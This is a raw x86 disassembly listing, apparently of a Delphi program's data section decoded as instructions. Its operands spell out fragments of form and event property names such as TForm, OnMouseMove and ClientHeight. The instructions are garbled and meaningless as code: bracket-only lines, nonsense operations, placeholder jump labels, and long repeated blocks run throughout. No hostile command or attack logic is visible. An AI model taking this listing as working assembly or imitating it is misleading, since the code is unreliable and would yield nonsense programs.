add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi + edx * 2 ] ch
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
inc esi
outsd
rcl [ edi + 0x45 ] 0x0
or [ ebx ] cl
push esp
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
or [ esi ] al
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
or al 0x54
outsd
arpl [ ecx + 0x4e ] sp
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
outsd
jae r-xdata
push esp
add [ esi ] al
inc ebp
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx + 0x57740040 ] al
inc ebp
add [ ebp + 0x58040040 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
jns r-xdata
popad
je r-xdata
outsb
inc esi
outsd
jb r-xdata
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
push esi
inc ebp
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x10000040 ] al
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push edi
inc ebp
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
push ecx
jne r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
jae r-xdata
inc esi
outsd
jb r-xdata
outsb
je r-xdata
inc ebx
jb r-xdata
add [ eax ] al
add [ edi + edx * 2 + 0x45 ] dh
inc esi
outsd
jb r-xdata
add eax [ edx ]
add [ eax - 0x764bffbb ] cl
mov eax 0x48004552
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sub [ ecx + 0x45 ] bl
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add ah bl
mov eax [ ebp ]
sbb [ ebp + eax * 2 + 0x458d2400 ] cl
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ esi + eax * 4 + 0x45 ] dh
add [ eax ] dl
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebx * 2 ] bl
inc ebp
add al al
pop ebx
inc ebp
add [ eax ] al
add [ eax ] al
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x59280040 ] cl
inc ebp
jbe r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
jb r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
adc [ eax + 0x6f ] esi
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
jb r-xdata
lea eax [ eax ]
fcom [ ebp + 0x45 ]
inc esi
outsd
jb r-xdata
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
jae r-xdata
insd
outsd
add [ eax ] al
sub al 0x57
jae r-xdata
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
add ah bh
jbe r-xdata
add [ eax + 0x3 ] cl
inc edx
add [ eax ] al
mov [ ebp ] al
pop es
dec ecx
outsb
je r-xdata
add al [ eax ]
add [ eax ] ah
push ebp
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
push esp
push ebp
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x2
add [ eax ] al
and [ ebp + 0x45 ] dl
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ esi ] bh
pop edx
inc ebp
add [ esi - 0x7ffbaa5 ] ch
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
outsd
push eax
jb r-xdata
imul ebp [ edi + 0x6e ] 0x700c6c61
jae r-xdata
push esi
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
jae r-xdata
mov ah 0x89
jb r-xdata
add al [ eax ]
add [ eax + 0x48004552 ] bh
clc
inc ebp
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test [ eax + 0x45 ] bl
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_4558e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x5a
inc ebp
add al al
pop ebx
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
pop edx
inc ebp
add [ esi - 0x7ffbaa5 ] ch
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add ah bl
mov eax [ ebp ]
sbb [ ebp + eax * 2 + 0x458d2400 ] cl
add [ ecx + eax + 0x3600044 ] ch
inc edx
add [ ebp + edx * 4 + r--data ] bl
inc edx
add [ ecx + edx * 8 ] bh
inc ebp
add [ esi + eax * 4 + 0x45 ] dh
add [ eax ] dl
jb r-xdata
add al [ eax ]
add [ eax ] ah
push ebp
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
push esp
push ebp
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax + ebp * 2 ] bh
inc esp
add ah ah
leave
inc ebp
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0xc4
mov edx 0x8b000045
inc ebp
add [ ebx + ecx * 4 + 0x45 ] bh
add ah al
int 0x45
add [ eax ] bh
mov [ ebp ] al
enter 0x45c8 0x0
test al 0xaf
inc ebp
add [ edx + ecx * 8 + 0x45 ] bh
add [ eax - 0x6b ] ah
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
adc [ eax ] al
cmp al 0x2
add [ eax ] al
and [ ebp + 0x45 ] dl
add [ eax ] al
daa
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x4c00459c ] al
inc eax
inc esp
add [ ecx + ebp * 4 + 0x45 ] al
add [ esp + ebp * 4 - 0x549fffbb ] ah
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add ah bl
lodsd [ esi ]
inc ebp
add [ eax + 0x3f ] cl
inc esp
add al bh
imul eax [ eax + eax - 0x30 ] 0xffffffb4
inc ebp
add ah ch
jge r-xdata
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
jl r-xdata
add al [ eax ]
add [ eax + 0x48004552 ] bh
add eax [ edx ]
add [ eax - 0x764bffbb ] cl
inc ebp
add [ eax + 0x20004034 ] ch
scasb [ edi ]
inc ebp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ edx + ecx * 4 ] bl
inc ebp
add ah bh
jbe r-xdata
clc
inc ebp
sub_456112
add al 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010f474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
dec ecx
imul ebp [ ebp - 0x78 ] 0x8004550
add al [ eax ]
inc [ eax ]
add [ ebp ] sub_45a104
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
outsd
outsb
je r-xdata
inc esp
add [ eax + 0x2 ] ah
add bh bh
xor [ edx - 0x5efbffbb ] ah
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e002f ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
and [ edx ] eax
inc eax
add al [ eax ]
push eax
add [ eax ] al
push ss
inc edx
add [ eax ] ch
add bh bh
mov eax 0xc8004404
add al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
and eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
push ebp
inc ebp
add [ edi ] ch
add al [ eax ]
push [ ecx ]
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] eax
or [ esi + 0x6f ] eax
jb r-xdata
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
jo r-xdata
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
insb
inc edx
popad
jb r-xdata
push ebx
je r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
inc esp
add [ eax + 0x2 ] cl
add bh bh
jl r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add [ ecx ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4904002b ] al
adc [ eax ] al
dec esp
add [ eax ] al
jmp [ ebx + edi * 8 - 0x6e3fffbd ]
insb
push esp
outsb
sub al 0x57
inc ebp
outsb
arpl [ eax - 0x4 ] bp
hlt
inc eax
add [ esp - 0x5b3fffbb ] dh
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax 0x63530600
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
adc [ eax ] al
push eax
movsb [ edi ] [ esi ]
inc ebp
add [ esp + 0x45 ] ah
adc [ eax ] al
xor al 0x2
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
push esi
inc ebp
add [ eax ] dh
add al [ eax ]
[ eax + 0x40045a4 ]
mov eax [ 0x45 ]
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x4dc0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
mov eax 0x40004594
and al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
dec edi
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
je r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
inc [ eax - 0x3fffbc05 ]
xchg ecx eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
jne r-xdata
jpe r-xdata
popad
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
sub eax [ edx ]
add bh bh
mov al 0xa5
inc ebp
add [ ecx ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
je r-xdata
in eax dx
add al 0xa1
jb r-xdata
push ecx
dec esp
jns r-xdata
outsb
inc ebx
dec edi
dec eax
in eax dx
inc esp
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
add [ 0x63530600 ] dh
push eax
inc ebp
add [ edx + eax ] cl
add bh bh
adc [ ecx - 0x5efbffbb ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
dec esp
les edi [ ebx + 0xc80043 ]
add bh bh
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax + 0x45 ] bl
add [ eax - 0x6700fffe ] bl
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc ecx
jns r-xdata
add [ eax + 0x2 ] bl
add bh bh
push esp
mov [ 0xffffffffa1040045 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec edi
outsb
inc esp
jb r-xdata
sbb [ ecx + 0x1b00043 ] bh
add bh bh
mov al 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ edx ] cl
dec edi
outsb
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
jns r-xdata
dec esp
jae r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
inc ebx
jb r-xdata
add al [ eax ]
inc [ ecx ]
push ecx
outsb
push edx
jae r-xdata
add [ eax - 0x7700fffe ] cl
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003c ] al
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
adc al 0xb8
inc ebx
add al ch
add [ eax ] al
jb r-xdata
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
inc ebx
insb
outsd
jae r-xdata
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003d ] al
push esp
mov ebx 0xc00043
add bh bh
rol [ eax ] 0x0
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004f ] al
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x4c6f666e
jns r-xdata
outsb
outsw
dec esp
jo r-xdata
mov eax 0x1080043
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
add [ eax + 0x4f0a0044 ] al
mov ecx 0x1b80043
add bh bh
mov eax 0x1ff0001
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
add [ eax + 0x4f090045 ] al
outsb
inc esp
jae r-xdata
js r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebx
add al bl
add [ eax ] eax
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06004d ] al
jbe r-xdata
mov bh 0x43
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x38 ] bp
mov edx 0x1d00043
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esp
add [ 0x65476e4f ] cl
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
jns r-xdata
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0046 ] al
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
mov dh 0x43
push eax
mov bh 0x43
add al ah
add [ eax ] eax
jmp eax
add [ eax ] al
or [ ecx ] 0xa
je r-xdata
outsb
dec eax
imul esp [ ebp - 0x80 ] 0xa8004558
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
mov eax 0xe80043
add bh bh
call 0x5446689
mov eax [ 0x45 ]
add [ eax - 0x80000000 ] al
dec ecx
add [ edx ] cl
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
mov al [ 0x4ff0002 ]
mov eax [ 0x45 ]
add [ eax - 0x80000000 ] al
inc esi
jo r-xdata
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090054 ] al
outsb
dec ebp
outsd
jne r-xdata
add al bl
mov dh 0x43
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0052 ] al
outsb
dec ebp
outsd
jne r-xdata
dec ebp
add [ esi ] al
dec edi
add al [ eax ]
jns r-xdata
outsd
jne r-xdata
push ebp
jo r-xdata
insb
fdivr [ ebx + eax * 2 + 0x14000 ]
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
inc esp
outsd
ja r-xdata
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add al 0xa1
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
insb
add al dl
add al [ eax ]
call eax
jns r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax + 0x1 ] cl
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
mov esp 0x1380043
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebp
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
push edi
push 0x446c6565
outsd
ja r-xdata
add [ eax ] al
mov al [ 0xffffffffd80043b6 ]
outsd
arpl [ ebx + 0x10 ] bp
mov edx 0x1f00043
add bh bh
[ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
ror ah 0x69
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 2 ] cl
add al cl
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06005b ] al
outsb
push ebx
push 0xba7c776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
rol [ edx ] 0x0
jns r-xdata
add [ edi ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
push edi
push 0xdc6c6565
mov esp 0x1400043
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
je r-xdata
jpe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
inc esp
outsb
dec ebp
fdivr [ ebx + eax * 2 + 0x14800 ]
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax - 0x6d ] dh
inc ebp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax + 0x64 ]
xchg ebp eax
inc ebp
add [ eax ] dh
xchg esp eax
inc ebp
add [ eax + 0x4 ] bl
inc esp
add ah bl
xchg ebp eax
inc ebp
add [ edi + ecx * 4 - 0x5823ffbb ] cl
inc ecx
add [ eax + 0x180045d4 ] al
mov [ ebp ] es
and al 0x8d
inc ebp
